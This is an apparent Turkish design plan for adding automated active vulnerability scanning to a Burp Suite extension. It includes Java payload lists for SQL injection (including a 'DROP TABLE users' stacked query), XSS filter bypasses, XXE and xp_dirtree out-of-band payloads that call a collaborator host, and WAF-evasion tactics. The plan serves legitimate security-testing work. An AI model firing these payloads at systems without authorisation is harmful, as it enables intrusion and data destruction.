# Dinamik Test Özellikleri - İmplementasyon Planı

## 📋 Genel Bakış

**Hedef:** AppSecHunter'a tam otomatik dinamik test yetenekleri eklemek

**Mevcut Durum:** Scanner şu anda sadece pasif analiz yapıyor (yakalanmış trafiği AI ile analiz ediyor)

**Hedeflenen Durum:** Burp Scanner benzeri tam otomatik active scanning

---

## 🎯 Kullanıcı Gereksinimleri

### 1. Yaklaşım
✅ **Tam Otomatik** - Burp Scanner gibi
- IScannerInsertionPoint API kullanımı
- Her parametreye otomatik payload injection
- Kullanıcı onayı gerektirmez

### 2. Test Türleri
✅ **Tüm test türleri:**
- Injection Testing (SQL, Command, LDAP)
- XSS & HTML Injection
- Authentication & Authorization (IDOR, privilege escalation)
- Advanced Testing (XXE, SSRF, deserialization, file upload, race conditions)

### 3. Rate Limiting
✅ **Orta - Akıllı throttling**
- Endpoint başına max 5 req/sec
- WAF detection ile otomatik yavaşlama

### 4. Out-of-Band Testing
✅ **Burp Collaborator benzeri**
- DNS/HTTP callback sunucusu
- Blind SQLi, XXE, SSRF tespiti

---

## 🏗️ Mimari Tasarım

### Yeni Paket Yapısı

```
src/main/java/burp/
├── [Mevcut dosyalar]
│
├── active/                          # YENİ: Active scanning paketi
│   ├── ActiveScanner.java          # Ana orchestrator
│   ├── InsertionPointManager.java   # Injection point tespiti
│   ├── RequestModifier.java         # Request modifikasyonu
│   ├── ResponseComparator.java      # Cevap karşılaştırma
│   ├── TimingAnalyzer.java          # Timing analizi
│   └── ThrottleManager.java         # Rate limiting
│
├── payloads/                        # YENİ: Payload tanımları
│   ├── PayloadEngine.java          # Ana payload generator
│   ├── SQLInjectionPayloads.java   # SQL injection payloadları
│   ├── XSSPayloads.java            # XSS payloadları
│   ├── CommandInjectionPayloads.java
│   ├── LDAPPayloads.java
│   ├── XXEPayloads.java
│   ├── SSRFPayloads.java
│   ├── DeserializationPayloads.java
│   └── FileUploadPayloads.java
│
├── oob/                            # YENİ: Out-of-band testing
│   ├── OOBCollaborator.java       # Callback sunucusu
│   ├── DNSServer.java             # DNS listener
│   └── HTTPServer.java            # HTTP callback listener
│
└── detectors/                      # YENİ: Vulnerability detectors
    ├── ErrorBasedDetector.java    # Error mesajları ile tespit
    ├── BlindBooleanDetector.java  # Boolean-based blind
    ├── TimeBasedDetector.java     # Time-based blind
    └── OOBDetector.java           # Out-of-band tespit
```

---

## 📦 Yeni Komponenler

### 1. ActiveScanner.java
**Amaç:** Ana active scanning orchestrator

**Sorumluluklar:**
- IScannerCheck.doActiveScan() implementasyonu
- Insertion point tespiti
- Payload generation koordinasyonu
- Request gönderimi ve response analizi
- Findings oluşturma

**Temel Yapı:**
```java
public class ActiveScanner {
    private PayloadEngine payloadEngine;
    private RequestModifier requestModifier;
    private ResponseComparator responseComparator;
    private TimingAnalyzer timingAnalyzer;
    private ThrottleManager throttleManager;
    private InsertionPointManager insertionPointManager;

    public List<IScanIssue> scan(IHttpRequestResponse baseRequest,
                                  IScannerInsertionPoint insertionPoint) {
        // 1. Baseline response al
        // 2. Payload'ları generate et
        // 3. Her payload için:
        //    - Request'i modifiye et
        //    - Throttle check
        //    - Gönder
        //    - Response'u analiz et
        //    - Vulnerability tespit
        // 4. IScanIssue listesi döndür
    }
}
```

### 2. PayloadEngine.java
**Amaç:** Tüm payload tiplerini generate etmek

**Temel Yapı:**
```java
public class PayloadEngine {

    public enum PayloadType {
        SQL_ERROR_BASED,
        SQL_BOOLEAN_BLIND,
        SQL_TIME_BASED,
        SQL_UNION_BASED,
        XSS_REFLECTED,
        XSS_STORED,
        COMMAND_INJECTION,
        LDAP_INJECTION,
        XXE,
        SSRF,
        DESERIALIZATION,
        FILE_UPLOAD_BYPASS
    }

    public List<Payload> generatePayloads(PayloadType type,
                                          String context) {
        // Context: GET param, POST param, Header, Cookie, etc.
    }

    // Her payload tipi için özel generator
    private List<Payload> generateSQLPayloads();
    private List<Payload> generateXSSPayloads();
    // ...
}
```

### 3. SQLInjectionPayloads.java
**Payload Kategorileri:**

```java
public class SQLInjectionPayloads {

    // Error-based
    public static final String[] ERROR_BASED = {
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "') OR ('1'='1",
        "' UNION SELECT NULL--",
        "' AND 1=CAST(0x01 as int)--"
    };

    // Boolean-based blind
    public static final String[] BOOLEAN_BLIND = {
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "') AND ('1'='1",
        "') AND ('1'='2"
    };

    // Time-based blind
    public static final String[] TIME_BASED_MYSQL = {
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "') AND SLEEP(5)--",
        "1' AND SLEEP(5)#"
    };

    public static final String[] TIME_BASED_MSSQL = {
        "'; WAITFOR DELAY '0:0:5'--",
        "') WAITFOR DELAY '0:0:5'--"
    };

    public static final String[] TIME_BASED_POSTGRES = {
        "'; SELECT pg_sleep(5)--",
        "') OR pg_sleep(5)--"
    };

    public static final String[] TIME_BASED_ORACLE = {
        "' AND DBMS_LOCK.SLEEP(5)--",
        "') AND DBMS_LOCK.SLEEP(5)--"
    };

    // UNION-based
    public static String[] generateUnionPayloads(int columns) {
        // NULL-based column counting
        // ' UNION SELECT NULL,NULL,NULL--
    }

    // Stacked queries
    public static final String[] STACKED_QUERIES = {
        "'; DROP TABLE users--",
        "'; INSERT INTO...",
        "'; UPDATE users SET..."
    };

    // Out-of-band (OOB)
    public static String[] generateOOBPayloads(String oobDomain) {
        // MySQL: ' UNION SELECT LOAD_FILE(CONCAT('\\\\',oobDomain,'\\a'))--
        // MSSQL: '; EXEC xp_dirtree '\\\\'+oobDomain+'\\a'--
    }
}
```

### 4. XSSPayloads.java
```java
public class XSSPayloads {

    // Basic reflection tests
    public static final String[] REFLECTION_MARKERS = {
        "xss" + UUID.randomUUID(),  // Unique marker
        "<xss>",
        "\"xss\"",
        "'xss'"
    };

    // Simple XSS
    public static final String[] SIMPLE_XSS = {
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>"
    };

    // Encoding bypasses
    public static final String[] ENCODED_XSS = {
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
    };

    // Context-specific
    public String[] generateContextPayloads(String context) {
        // HTML context, attribute context, JavaScript context, etc.
    }

    // Filter bypasses
    public static final String[] FILTER_BYPASSES = {
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=\"alert(1)\">",
        "<svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>"
    };
}
```

### 5. RequestModifier.java
**Amaç:** IHttpRequestResponse'u klonla ve modifiye et

```java
public class RequestModifier {
    private IExtensionHelpers helpers;

    public IHttpRequestResponse modifyRequest(
            IHttpRequestResponse original,
            IScannerInsertionPoint insertionPoint,
            byte[] payload) {

        // 1. Original request'i clone et
        byte[] originalRequest = original.getRequest();

        // 2. Insertion point kullanarak payload'ı ekle
        byte[] modifiedRequest = insertionPoint.buildRequest(payload);

        // 3. Yeni IHttpRequestResponse oluştur
        return callbacks.makeHttpRequest(
            original.getHttpService(),
            modifiedRequest
        );
    }

    public byte[] replaceParameter(byte[] request,
                                   String paramName,
                                   String newValue) {
        // Manuel parameter replacement
    }

    public byte[] addHeader(byte[] request,
                           String headerName,
                           String headerValue) {
        // Header ekleme
    }
}
```

### 6. ResponseComparator.java
**Amaç:** Baseline vs modified response karşılaştırması

```java
public class ResponseComparator {

    public static class ComparisonResult {
        public boolean isDifferent;
        public int statusCodeDiff;
        public int contentLengthDiff;
        public double contentSimilarity;  // 0.0 - 1.0
        public List<String> newErrorMessages;
        public boolean hasNewReflection;
    }

    public ComparisonResult compare(IHttpRequestResponse baseline,
                                    IHttpRequestResponse modified) {

        ComparisonResult result = new ComparisonResult();

        // 1. Status code karşılaştır
        result.statusCodeDiff = getStatusCode(modified) - getStatusCode(baseline);

        // 2. Content length karşılaştır
        result.contentLengthDiff = modified.getResponse().length -
                                   baseline.getResponse().length;

        // 3. Content similarity (Levenshtein distance)
        result.contentSimilarity = calculateSimilarity(
            new String(baseline.getResponse()),
            new String(modified.getResponse())
        );

        // 4. Error message detection
        result.newErrorMessages = detectNewErrors(baseline, modified);

        // 5. Reflection detection
        result.hasNewReflection = detectReflection(modified, marker);

        return result;
    }

    private List<String> detectNewErrors(IHttpRequestResponse baseline,
                                         IHttpRequestResponse modified) {
        // SQL errors: "SQL syntax", "mysql_fetch", "ORA-", etc.
        // PHP errors: "Warning:", "Fatal error:", etc.
        // Java errors: "Exception", "SQLException", etc.
    }
}
```

### 7. TimingAnalyzer.java
**Amaç:** Time-based vulnerability tespiti

```java
public class TimingAnalyzer {
    private static final int BASELINE_SAMPLES = 3;
    private static final double TIME_THRESHOLD = 4.5; // seconds
    private static final double VARIANCE_MULTIPLIER = 3.0;

    public static class TimingResult {
        public boolean isTimeBasedVulnerable;
        public long baselineAvg;
        public long testResponseTime;
        public double confidence;
    }

    public TimingResult analyzeTimingAttack(
            IHttpRequestResponse baseRequest,
            int sleepSeconds) {

        // 1. Baseline response time hesapla
        long baselineAvg = calculateBaseline(baseRequest);
        long baselineStdDev = calculateStdDev(baseRequest);

        // 2. Time-based payload gönder
        long testStart = System.currentTimeMillis();
        IHttpRequestResponse testResponse = sendPayload(baseRequest,
                                                        "' AND SLEEP(" + sleepSeconds + ")--");
        long testTime = System.currentTimeMillis() - testStart;

        // 3. Analiz et
        long expectedMin = baselineAvg + (sleepSeconds * 1000) - 1000;
        long expectedMax = baselineAvg + (sleepSeconds * 1000) + 2000;

        TimingResult result = new TimingResult();
        result.baselineAvg = baselineAvg;
        result.testResponseTime = testTime;

        if (testTime >= expectedMin && testTime <= expectedMax) {
            result.isTimeBasedVulnerable = true;
            result.confidence = calculateConfidence(baselineAvg, testTime, sleepSeconds);
        }

        return result;
    }

    private long calculateBaseline(IHttpRequestResponse request) {
        long total = 0;
        for (int i = 0; i < BASELINE_SAMPLES; i++) {
            long start = System.currentTimeMillis();
            callbacks.makeHttpRequest(request.getHttpService(), request.getRequest());
            total += System.currentTimeMillis() - start;
        }
        return total / BASELINE_SAMPLES;
    }
}
```

### 8. OOBCollaborator.java
**Amaç:** Out-of-band callback sunucusu (Burp Collaborator benzeri)

```java
public class OOBCollaborator {
    private DNSServer dnsServer;
    private HTTPServer httpServer;
    private String collaboratorDomain;
    private Map<String, OOBInteraction> pendingInteractions;

    public void start(String domain, int dnsPort, int httpPort) {
        this.collaboratorDomain = domain;

        // DNS sunucusu başlat
        dnsServer = new DNSServer(dnsPort);
        dnsServer.setInteractionCallback(this::onDNSInteraction);
        dnsServer.start();

        // HTTP sunucusu başlat
        httpServer = new HTTPServer(httpPort);
        httpServer.setInteractionCallback(this::onHTTPInteraction);
        httpServer.start();
    }

    public String generatePayload(String vulnerabilityType, String testId) {
        // testId.vulnerabilityType.collaboratorDomain
        String subdomain = testId + "." + vulnerabilityType;

        switch (vulnerabilityType) {
            case "XXE":
                return "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://" + subdomain +
                       "." + collaboratorDomain + "/xxe\">]><foo>&xxe;</foo>";

            case "SSRF":
                return "http://" + subdomain + "." + collaboratorDomain + "/ssrf";

            case "SQL_OOB":
                return "'; EXEC xp_dirtree '\\\\" + subdomain +
                       "." + collaboratorDomain + "\\a'--";

            case "BLIND_XSS":
                return "<script src='http://" + subdomain +
                       "." + collaboratorDomain + "/xss.js'></script>";
        }

        return null;
    }

    public boolean checkInteraction(String testId, long timeoutMs) {
        // testId için interaction olup olmadığını kontrol et
        long start = System.currentTimeMillis();
        while (System.currentTimeMillis() - start < timeoutMs) {
            if (pendingInteractions.containsKey(testId)) {
                return true;
            }
            Thread.sleep(500);
        }
        return false;
    }

    private void onDNSInteraction(String query, String sourceIP) {
        // Query parse et: testId.vulnerabilityType.domain
        String[] parts = query.split("\\.");
        if (parts.length >= 2) {
            String testId = parts[0];
            String vulnType = parts[1];

            pendingInteractions.put(testId, new OOBInteraction(
                "DNS", vulnType, query, sourceIP, System.currentTimeMillis()
            ));
        }
    }

    private void onHTTPInteraction(String path, String sourceIP,
                                   Map<String, String> headers) {
        // Similar to DNS
    }
}
```

### 9. InsertionPointManager.java
**Amaç:** Burp'ün IScannerInsertionPoint API'sini kullan

```java
public class InsertionPointManager {
    private IExtensionHelpers helpers;

    public List<IScannerInsertionPoint> getInsertionPoints(
            IHttpRequestResponse baseRequest) {

        List<IScannerInsertionPoint> points = new ArrayList<>();

        // 1. URL parameters
        points.addAll(helpers.getInsertionPoints(baseRequest));

        // 2. Custom insertion points
        points.add(createHeaderInsertionPoint(baseRequest, "User-Agent"));
        points.add(createHeaderInsertionPoint(baseRequest, "Referer"));
        points.add(createCookieInsertionPoint(baseRequest));

        // 3. JSON body parameters (eğer Content-Type: application/json)
        if (isJSON(baseRequest)) {
            points.addAll(createJSONInsertionPoints(baseRequest));
        }

        // 4. XML body parameters
        if (isXML(baseRequest)) {
            points.addAll(createXMLInsertionPoints(baseRequest));
        }

        return points;
    }

    private IScannerInsertionPoint createHeaderInsertionPoint(
            IHttpRequestResponse request,
            String headerName) {
        // Custom IScannerInsertionPoint implementation
    }
}
```

### 10. ThrottleManager.java
**Amaç:** Akıllı rate limiting

```java
public class ThrottleManager {
    private Map<String, RequestHistory> hostHistory;
    private static final int MAX_REQUESTS_PER_SECOND = 5;
    private static final long WAF_DETECTION_THRESHOLD = 3; // 3 consecutive blocks

    private static class RequestHistory {
        Queue<Long> timestamps;
        int consecutiveBlocks;
        boolean wafDetected;
        long lastRequestTime;
    }

    public void throttle(String host) {
        RequestHistory history = hostHistory.computeIfAbsent(
            host, k -> new RequestHistory()
        );

        // 1. WAF detected ise yavaşla
        if (history.wafDetected) {
            Thread.sleep(2000 + random.nextInt(3000)); // 2-5 sec
            return;
        }

        // 2. Son 1 saniyedeki request sayısını kontrol et
        long now = System.currentTimeMillis();
        long oneSecondAgo = now - 1000;

        // Eski timestamp'leri temizle
        while (!history.timestamps.isEmpty() &&
               history.timestamps.peek() < oneSecondAgo) {
            history.timestamps.poll();
        }

        // 3. Rate limit check
        if (history.timestamps.size() >= MAX_REQUESTS_PER_SECOND) {
            long oldestInWindow = history.timestamps.peek();
            long sleepTime = 1000 - (now - oldestInWindow) + 100;
            if (sleepTime > 0) {
                Thread.sleep(sleepTime);
            }
        }

        // 4. Timestamp kaydet
        history.timestamps.offer(System.currentTimeMillis());
    }

    public void reportBlock(String host, IHttpRequestResponse response) {
        // 403, 429, WAF signature detection
        RequestHistory history = hostHistory.get(host);
        if (history != null) {
            history.consecutiveBlocks++;

            if (history.consecutiveBlocks >= WAF_DETECTION_THRESHOLD) {
                history.wafDetected = true;
                stdout.println("[!] WAF detected on " + host +
                             " - switching to slow mode");
            }
        }
    }

    public void reportSuccess(String host) {
        RequestHistory history = hostHistory.get(host);
        if (history != null) {
            history.consecutiveBlocks = 0;
        }
    }
}
```

---

## 🔄 Mevcut Dosyalara Yapılacak Değişiklikler

### 1. BurpExtender.java

**Değişiklik:** `doActiveScan()` implementasyonu

```java
// ÖNCEKİ:
@Override
public java.util.List<IScanIssue> doActiveScan(
        IHttpRequestResponse baseRequestResponse,
        IScannerInsertionPoint insertionPoint) {
    return null;  // NOT IMPLEMENTED
}

// YENİ:
private ActiveScanner activeScanner;

@Override
public java.util.List<IScanIssue> doActiveScan(
        IHttpRequestResponse baseRequestResponse,
        IScannerInsertionPoint insertionPoint) {

    // Active scanning aktif mi?
    if (!settings.isActiveScanEnabled()) {
        return null;
    }

    // Active scanner henüz başlatılmadıysa
    if (activeScanner == null) {
        stdout.println("[!] Active scanner not initialized");
        return null;
    }

    try {
        return activeScanner.scan(baseRequestResponse, insertionPoint);
    } catch (Exception e) {
        stderr.println("[✗] Active scan error: " + e.getMessage());
        e.printStackTrace(stderr);
        return null;
    }
}

// initializeManagers() metoduna ekle:
private void initializeManagers() throws Exception {
    // ... existing code ...

    // Initialize Active Scanner
    if (settings.isActiveScanEnabled()) {
        activeScanner = new ActiveScanner(
            callbacks,
            helpers,
            qwenClient,
            databaseManager,
            settings,
            stdout,
            stderr
        );
        stdout.println("[✓] Active Scanner initialized");
    }
}
```

### 2. Settings.java

**Eklenmesi Gereken Ayarlar:**

```java
// Active scanning settings
private boolean activeScanEnabled = false;
private int maxPayloadsPerPoint = 50;
private boolean sqlInjectionEnabled = true;
private boolean xssEnabled = true;
private boolean commandInjectionEnabled = true;
private boolean ldapInjectionEnabled = true;
private boolean xxeEnabled = true;
private boolean ssrfEnabled = true;
private boolean deserializationEnabled = true;
private boolean idorEnabled = true;
private boolean fileUploadEnabled = true;

// Timing settings
private int timingBasedSleepSeconds = 5;
private int baselineSamples = 3;

// OOB settings
private boolean oobEnabled = false;
private String oobDomain = "";
private int oobDnsPort = 53;
private int oobHttpPort = 8080;

// Throttling settings
private int maxRequestsPerSecond = 5;
private boolean autoWafDetection = true;

// Getters and setters...
```

### 3. SettingsPanel.java

**UI Eklemeleri:**

```java
private void createActiveScanningSetting() {
    JPanel panel = new JPanel(new GridLayout(0, 1, 5, 5));
    panel.setBorder(BorderFactory.createTitledBorder("Active Scanning"));

    // Enable/Disable
    JCheckBox activeScanCheckbox = new JCheckBox("Enable Active Scanning");
    activeScanCheckbox.setSelected(settings.isActiveScanEnabled());

    // Test Types
    JCheckBox sqlCheckbox = new JCheckBox("SQL Injection");
    JCheckBox xssCheckbox = new JCheckBox("XSS");
    JCheckBox commandCheckbox = new JCheckBox("Command Injection");
    // ... diğer test tipleri

    // OOB Settings
    JCheckBox oobCheckbox = new JCheckBox("Enable Out-of-Band Testing");
    JTextField oobDomainField = new JTextField(settings.getOobDomain());

    // Throttling
    JSpinner rpsSpinner = new JSpinner(
        new SpinnerNumberModel(settings.getMaxRequestsPerSecond(), 1, 20, 1)
    );

    // Add all to panel
    panel.add(activeScanCheckbox);
    panel.add(sqlCheckbox);
    // ...
}
```

### 4. DatabaseManager.java

**Yeni Tablolar:**

```sql
-- Active scan results
CREATE TABLE IF NOT EXISTS active_scan_results (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    scan_id TEXT NOT NULL,
    url TEXT NOT NULL,
    insertion_point TEXT NOT NULL,
    payload TEXT NOT NULL,
    vulnerability_type TEXT NOT NULL,
    detection_method TEXT NOT NULL, -- error, blind, timing, oob
    confidence REAL NOT NULL,
    evidence TEXT,
    timestamp INTEGER NOT NULL
);

-- Baseline responses (for comparison)
CREATE TABLE IF NOT EXISTS baseline_responses (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT NOT NULL UNIQUE,
    status_code INTEGER,
    content_length INTEGER,
    response_time INTEGER,
    response_hash TEXT,
    timestamp INTEGER NOT NULL
);

-- OOB interactions
CREATE TABLE IF NOT EXISTS oob_interactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    test_id TEXT NOT NULL,
    interaction_type TEXT NOT NULL, -- DNS, HTTP
    vulnerability_type TEXT NOT NULL,
    query TEXT,
    source_ip TEXT,
    timestamp INTEGER NOT NULL
);
```

### 5. ScanManager.java

**Active Scan Desteği:**

```java
public void startActiveScan(IHttpRequestResponse message) {
    if (!settings.isActiveScanEnabled()) {
        stdout.println("[!] Active scanning is disabled");
        return;
    }

    // Get insertion points
    List<IScannerInsertionPoint> insertionPoints =
        insertionPointManager.getInsertionPoints(message);

    stdout.println("[*] Found " + insertionPoints.size() +
                  " insertion points for active scanning");

    // Scan each insertion point
    for (IScannerInsertionPoint point : insertionPoints) {
        executor.submit(() -> {
            try {
                List<IScanIssue> issues = activeScanner.scan(message, point);
                if (issues != null && !issues.isEmpty()) {
                    for (IScanIssue issue : issues) {
                        callbacks.addScanIssue(issue);
                        // Also notify UI
                        notifyListeners("active_finding", issue);
                    }
                }
            } catch (Exception e) {
                stderr.println("[✗] Active scan error: " + e.getMessage());
            }
        });
    }
}
```

---

## 🚀 İmplementasyon Fazları

### Faz 1: Temel Altyapı (2-3 gün)
1. ✅ Yeni paket yapısını oluştur (active/, payloads/, oob/, detectors/)
2. ✅ Settings.java'ya yeni ayarları ekle
3. ✅ SettingsPanel.java'ya UI ekle
4. ✅ DatabaseManager.java'ya yeni tabloları ekle
5. ✅ PayloadEngine.java temel yapısını oluştur

### Faz 2: Payload Generation (2-3 gün)
1. ✅ SQLInjectionPayloads.java - Tüm SQL payload tipleri
2. ✅ XSSPayloads.java - XSS payloadları
3. ✅ CommandInjectionPayloads.java
4. ✅ LDAPPayloads.java
5. ✅ XXEPayloads.java
6. ✅ SSRFPayloads.java
7. ✅ DeserializationPayloads.java
8. ✅ FileUploadPayloads.java

### Faz 3: Core Scanning Components (3-4 gün)
1. ✅ RequestModifier.java - Request modifikasyonu
2. ✅ ResponseComparator.java - Response karşılaştırma
3. ✅ TimingAnalyzer.java - Timing analizi
4. ✅ InsertionPointManager.java - Insertion point yönetimi
5. ✅ ThrottleManager.java - Rate limiting

### Faz 4: Detection Logic (2-3 gün)
1. ✅ ErrorBasedDetector.java
2. ✅ BlindBooleanDetector.java
3. ✅ TimeBasedDetector.java
4. ✅ OOBDetector.java

### Faz 5: Out-of-Band Infrastructure (3-4 gün)
1. ✅ DNSServer.java - DNS listener
2. ✅ HTTPServer.java - HTTP callback server
3. ✅ OOBCollaborator.java - Ana koordinatör

### Faz 6: ActiveScanner Integration (2-3 gün)
1. ✅ ActiveScanner.java - Ana orchestrator
2. ✅ BurpExtender.doActiveScan() implementasyonu
3. ✅ ScanManager.java active scan desteği
4. ✅ UI güncellemeleri

### Faz 7: Testing & Optimization (2-3 gün)
1. ✅ Test vulnerable app'lerde test (DVWA, WebGoat)
2. ✅ Performance optimizasyonu
3. ✅ False positive azaltma
4. ✅ Documentation

**Toplam Tahmini Süre:** 16-23 gün (yoğun çalışma ile 10-14 gün)

---

## ⚠️ Riskler ve Mitigasyon

### Risk 1: Performance Sorunları
**Problem:** Çok fazla payload gönderimi uygulamayı yavaşlatabilir veya hedef sistemi etkileyebilir

**Mitigasyon:**
- ThrottleManager ile akıllı rate limiting
- Settings'de max payload limiti
- Thread pool boyutu sınırlaması
- Scan pause/stop özellikleri

### Risk 2: False Positive Oranı
**Problem:** Dinamik testler yanlış pozitif bulabilir

**Mitigasyon:**
- Multiple verification (aynı payload'u 2-3 kez test et)
- AI ile doğrulama (şüpheli bulgular AI'ya sor)
- Confidence scoring (düşük confidence'lı bulguları işaretle)
- Baseline comparison (response'ları dikkatli karşılaştır)

### Risk 3: WAF/IPS Engellemesi
**Problem:** Agresif tarama WAF tarafından engellenebilir

**Mitigasyon:**
- Auto WAF detection (consecutive 403/429 responses)
- Otomatik slow-down
- Jitter ekleme (random delays)
- User-agent rotation

### Risk 4: OOB Sunucu Karmaşıklığı
**Problem:** DNS/HTTP sunucusu çalıştırmak karmaşık ve hataya açık

**Mitigasyon:**
- Başlangıçta OOB'yi optional yap
- Public Burp Collaborator API kullanımı (fallback)
- Hata durumunda graceful degradation
- Detaylı logging

### Risk 5: Memory/Resource Usage
**Problem:** Çok sayıda concurrent scan memory tüketebilir

**Mitigasyon:**
- Bounded thread pool
- Response caching limiti
- Scan queue size limiti
- JVM memory monitoring

---

## 🧪 Test Stratejisi

### 1. Unit Testing
Her component için:
- PayloadEngine: Payload generation doğruluğu
- ResponseComparator: Similarity calculation
- TimingAnalyzer: Timing threshold calculation
- ThrottleManager: Rate limiting logic

### 2. Integration Testing
- ActiveScanner end-to-end flow
- OOBCollaborator callback handling
- Database operations
- UI updates

### 3. Vulnerable App Testing
Test hedefleri:
- **DVWA** (Damn Vulnerable Web Application)
- **WebGoat** (OWASP)
- **Mutillidae**
- **bWAPP**

Her vulnerability type için:
- SQL Injection: Error-based, blind, time-based
- XSS: Reflected, stored
- Command Injection
- File upload
- IDOR

### 4. Performance Testing
- 100+ endpoint scan
- Concurrent scan limit testing
- Memory profiling
- Response time measurement

---

## 📊 Başarı Kriterleri

### Fonksiyonel Kriterler
✅ SQL Injection tespiti (error, blind, timing)
✅ XSS tespiti (reflected, stored)
✅ Command injection tespiti
✅ IDOR tespiti
✅ XXE tespiti
✅ SSRF tespiti
✅ File upload bypass tespiti
✅ OOB callback çalışıyor

### Performance Kriterleri
✅ Max 5 req/sec rate limiting çalışıyor
✅ WAF detection çalışıyor
✅ Memory kullanımı < 500MB (100 endpoint scan)
✅ UI responsive (scan sırasında donmuyor)

### Kullanılabilirlik Kriterleri
✅ Settings'den enable/disable edilebiliyor
✅ Scan progress gösteriliyor
✅ Scan pause/stop edilebiliyor
✅ Findings düzgün raporlanıyor
✅ False positive rate < %20

---

## 🔧 Configuration Örnekleri

### Hızlı Test Ortamı Konfigürasyonu
```java
settings.setActiveScanEnabled(true);
settings.setMaxRequestsPerSecond(10);  // Hızlı
settings.setMaxPayloadsPerPoint(100);  // Comprehensive
settings.setOobEnabled(false);  // OOB olmadan
settings.setAutoWafDetection(false);  // Test ortamında gerek yok
```

### Production-Safe Konfigürasyon
```java
settings.setActiveScanEnabled(true);
settings.setMaxRequestsPerSecond(2);  // Yavaş
settings.setMaxPayloadsPerPoint(20);  // Sınırlı
settings.setOobEnabled(true);  // OOB ile blind detection
settings.setAutoWafDetection(true);  // WAF detection aktif
settings.setTimingBasedSleepSeconds(3);  // Daha kısa timeout
```

### Aggressive Pentest Konfigürasyonu
```java
settings.setActiveScanEnabled(true);
settings.setMaxRequestsPerSecond(20);  // Çok hızlı
settings.setMaxPayloadsPerPoint(200);  // Her şeyi dene
settings.setOobEnabled(true);
settings.setAutoWafDetection(true);  // Ama yine de WAF detect et
```

---

## 📝 Sonraki Adımlar

1. **Plan Onayı:** Kullanıcıdan plan onayı al
2. **Faz 1 Başlat:** Temel altyapıyı oluştur
3. **İteratif Geliştirme:** Her faz sonunda test et
4. **Continuous Integration:** Her component hazır olduğunda entegre et
5. **Documentation:** Her component için javadoc ekle

---

## 📚 Referanslar

- [Burp Suite Extension API](https://portswigger.net/burp/extender/api/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

**Plan Durumu:** ✅ HAZIR - İmplementasyon Bekliyor
**Tahmini Tamamlanma:** 16-23 gün (yoğun çalışma ile 10-14 gün)
**Risk Seviyesi:** Orta (mitigasyon stratejileri mevcut)
